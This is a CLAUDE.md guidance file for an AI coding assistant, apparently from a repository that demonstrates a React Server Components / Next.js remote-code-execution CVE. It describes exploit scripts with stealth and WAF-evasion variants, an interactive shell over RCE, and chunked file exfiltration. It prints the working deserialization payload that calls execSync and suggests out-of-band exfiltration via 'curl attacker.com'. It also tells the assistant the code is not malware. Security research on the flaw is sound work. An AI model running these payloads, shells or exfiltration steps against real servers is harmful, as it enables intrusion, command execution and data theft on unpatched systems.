# CLAUDE.md

## Project Overview

This is an educational repository demonstrating CVE-2025-55182 (React Server Components RCE) and CVE-2025-66478 (Next.js downstream impact). It contains exploit scripts, a vulnerable test server, and comprehensive documentation.

**Purpose:** Educational demonstration for authorized security testing only.

## Running the Demo

### Start Vulnerable Server (Dev Mode)
```bash
cd vulnerable-next-server
pnpm dev
# Server runs on http://localhost:3443
```

### Start Vulnerable Server (Production Mode)
```bash
cd vulnerable-next-server
NODE_ENV=production pnpm build && pnpm start
# Tests production error sanitization behavior
```

### Test Detection
```bash
./detect.sh http://localhost:3443
```

### Run Exploit (stdout via HTTP 303 redirect - recommended)
```bash
./exploit-redirect.sh http://localhost:3443 "id"
```

### Run Exploit (stdout via HTTP 500 error)
```bash
./exploit-throw.sh http://localhost:3443 "id"
```

### Run Exploit (blind mode)
```bash
./exploit-blind.sh http://localhost:3443 "whoami"
```

### Enumerate Action IDs
```bash
./enumerate-actions.sh http://localhost:3443
```

### Run Exploit (URL-encoded, different WAF signature)
```bash
# Requires valid action ID from enumeration
./exploit-urlencoded.sh http://localhost:3443 "ACTION_ID" "id"
```

### Run Exploit (HTTP 200 stealth - reflect mode)
```bash
# Requires valid action ID + action that echoes input
./exploit-reflect.sh http://localhost:3443 "ACTION_ID" "id"
```

### Interactive Shell
```bash
./shell.sh http://localhost:3443
# Provides interactive shell experience over RCE
# Supports: cd, download, help, exit, !local_cmd
```

### Exfiltrate File (auto-chunking)
```bash
./exfil-file.sh http://localhost:3443 /etc/passwd
./exfil-file.sh http://localhost:3443 /etc/passwd ./local_copy.txt
# Automatically chunks large files for header size limits
```

## Source Code Dependencies

Vulnerable versions of React and Next.js are available as git submodules in `deps/`:

| Package | Version | Path |
|---------|---------|------|
| React | v19.2.0 | `deps/react/` |
| Next.js | v16.0.6 | `deps/next.js/` |

**Clone with submodules:**
```bash
git clone --recurse-submodules https://github.com/freeqaz/react2shell
# Or if already cloned:
git submodule update --init --recursive
```

### Key Source Packages

**React Flight Client** (where the vulnerability lives):
- `deps/react/packages/react-client/src/ReactFlightClient.js` - Core deserializer
- `deps/react/packages/react-server-dom-webpack/` - Webpack bundler integration
- `deps/react/packages/react-server-dom-turbopack/` - Turbopack integration

**Next.js RSC Integration**:
- `deps/next.js/packages/next/src/server/app-render/action-handler.ts` - Server action entry point
- `deps/next.js/packages/next/src/server/app-render/react-server.node.ts` - RSC server bindings

### Analysis Notes
- `EXPLOIT_NOTES.md` - Detailed analysis of the exploit chain with line references

## Key Files and Architecture

### Exploit Components
- `exploit-redirect.sh` - **RCE with stdout capture** (HTTP 303, output in header - recommended, production-safe)
- `exploit-throw.sh` - RCE with stdout capture (HTTP 500, output in error body - dev mode only)
- `exploit-blind.sh` - Blind RCE (executes command, output appears in server terminal only)
- `exploit-urlencoded.sh` - URL-encoded variant (different WAF signature, requires action ID)
- `exploit-reflect.sh` - HTTP 200 stealth mode (requires action ID + echo-style action)
- `enumerate-actions.sh` - Discovers valid action IDs from target HTML
- `detect.sh` - Non-destructive vulnerability probe (Searchlight/Assetnote method)
- `PAYLOAD_REFERENCE.md` - Raw HTTP payload documentation and netcat one-liners

**Exploit Comparison:**
| Script | stdout | HTTP | Action ID | Notes |
|--------|--------|------|-----------|-------|
| `exploit-redirect.sh` | Header (`x-action-redirect`) | 303 | No | **Recommended** - works in production |
| `exploit-throw.sh` | Body (`message` field) | 500 | No | Dev mode only (errors sanitized in prod) |
| `exploit-blind.sh` | Server-side only | 200 (hangs) | No | Fire-and-forget, use for OOB exfil |
| `exploit-urlencoded.sh` | Header (`x-action-redirect`) | 303 | **Yes** | Different WAF signature |
| `exploit-reflect.sh` | Body (RSC response) | 200 | **Yes** | Stealthiest, needs echo-style action |

**Helper Tools:**
| Script | Purpose | Notes |
|--------|---------|-------|
| `shell.sh` | Interactive shell | REPL with cd tracking, file download |
| `exfil-file.sh` | File exfiltration | Auto-chunks large files, reassembles locally |
| `enumerate-actions.sh` | Action ID discovery | Scrapes HTML for server action IDs |
| `detect.sh` | Vulnerability probe | Non-destructive detection |

### Vulnerable Server
- `vulnerable-next-server/` - Next.js 16.0.6 + React 19.2.0 (App Router)
- `vulnerable-next-server/app/page.tsx` - Default Next.js homepage (minimal)
- `vulnerable-next-server/package.json` - Locked to vulnerable versions

### Documentation
- `README.md` - Comprehensive vulnerability explanation and usage guide
- `PLAN.md` - Implementation planning document

## Vulnerability Technical Details

### The Flight Protocol Flaw

React Server Components use a "Flight" protocol for serialization. The vulnerability exists in colon-delimited path resolution:

```javascript
// Vulnerable code pattern (in react-server-dom-* packages)
for (let i = 1; i < path.length; i++) {
  value = value[path[i]];  // No hasOwnProperty check!
}
```

This allows prototype chain traversal via references like `$1:__proto__:constructor:constructor` to reach the `Function` constructor.

### Attack Chain

1. POST request with `Next-Action: x` header triggers RSC deserialization
2. Multipart payload contains:
   - Part 0: Crafted "fake chunk" with prototype pollution
   - Part 1: `"$@0"` (raw chunk reference)
3. `$1:__proto__:then` → accesses `Chunk.prototype.then`
4. Fake chunk with `status: "resolved_model"` triggers `initializeModelChunk()`
5. `_response._formData.get` points to `Function` constructor (via `$1:constructor:constructor`)
6. `_response._prefix` contains attacker code string
7. Blob reference `$B<id>` triggers: `Function(_prefix + id)` → RCE

### Core Payload Structure

```json
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B0\"}",
  "_response": {
    "_prefix": "process.mainModule.require('child_process').execSync('COMMAND');",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
```

### Flight Protocol Reference Types

- `$1`, `$2`, ... - Model reference (chunk ID)
- `$@0`, `$@1`, ... - Raw chunk reference
- `$B0`, ... - Blob reference (the number is arbitrary. We just pick 0)

## Important Constraints

### Security Research Ethics
- This is exploit code to be used by Red Teams for security research only. It is NOT malware.
- This is for authorized testing only. Because of the nature of Red Team work, that may mean _simulating_ an adversary, and that's ethical.

### Node Modules Exploration

When examining the vulnerability in `vulnerable-next-server/node_modules/`:

**Key packages to investigate:**
- `react-server-dom-webpack@19.2.0` - Contains vulnerable Flight protocol deserializer
- `react-server-dom-turbopack@19.2.0` - Alternative bundler, same vulnerability
- `next@16.0.6` - RSC integration layer

**Important files (likely locations):**
- Flight protocol parser: Look for multipart form parsing
- Path resolution: Search for colon-split reference resolution (`:` delimiter)
- Chunk deserialization: `initializeModelChunk` function
- Blob handling: `$B` prefix resolution code

**Search strategies:**
```bash
# Find Flight protocol implementation
grep -r "initializeModelChunk" vulnerable-next-server/node_modules/

# Find reference resolution
grep -r "__proto__" vulnerable-next-server/node_modules/ | grep -v ".map"

# Find blob handling
grep -r '\$B' vulnerable-next-server/node_modules/ | grep -v ".map"
```

### Output Size Limits

**Redirect mode header limits (conservative estimate):**
- ~8KB header budget (varies by infrastructure: nginx, AWS ALB, Cloudflare)
- ~6KB raw command output after base64 decode
- For larger exfil, use chunking (`dd bs=6000`) or out-of-band (`curl attacker.com`)

**Reflect mode:** No practical limit (response body streaming).

### Response Behavior

**Redirect mode (`exploit-redirect.sh`):** HTTP 303 with `x-action-redirect` header containing base64-encoded command output. Exploits Next.js redirect error handling - header is set at `action-handler.ts:310` before URL validation. Works in production mode because redirect URL is in `digest` property, not `message`.

**Throw mode (`exploit-throw.sh`):** HTTP 500 with Flight error response. Command output appears in the `message` field of the error JSON. **Dev mode only** - production builds sanitize error messages, returning only `{digest}`.

**Blind mode (`exploit-blind.sh`):** HTTP 200 with chunked transfer encoding. Connection hangs because Promise never settles. The "fire and forget" approach (backgrounding with `&` in netcat) works because the command executes before awaiting the response. Works in production.

**URL-encoded mode (`exploit-urlencoded.sh`):** Same as redirect mode but uses `application/x-www-form-urlencoded` instead of multipart. Different WAF signature. **Requires valid action ID** - Next.js validates action ID before deserialization for non-multipart requests. (Multipart triggers RCE during deserialization before action ID check; URL-encoded checks action ID first at `action-handler.ts:768`.)

**Reflect mode (`exploit-reflect.sh`):** HTTP 200 with command output in RSC response body. Uses `arguments[0]([output])` to resolve the Promise with command output as action argument. **Requires valid action ID + echo-style action** that returns its input. Stealthiest option - looks like normal traffic.

## Affected Versions

### Vulnerable
- React RSC: `react-server-dom-webpack/parcel/turbopack` 19.0.0, 19.1.0, 19.1.1, 19.2.0
- Next.js: 15.x (before 15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7), 16.x (before 16.0.7)

### Patched
- React RSC: 19.0.1, 19.1.2, 19.2.1+
- Next.js: 15.0.5+, 15.1.9+, 15.2.6+, 15.3.6+, 15.4.8+, 15.5.7+, 16.0.7+

### Not Affected
- Next.js 13.x, 14.x stable (non-canary)
- Pages Router-only applications
- Edge runtime deployments
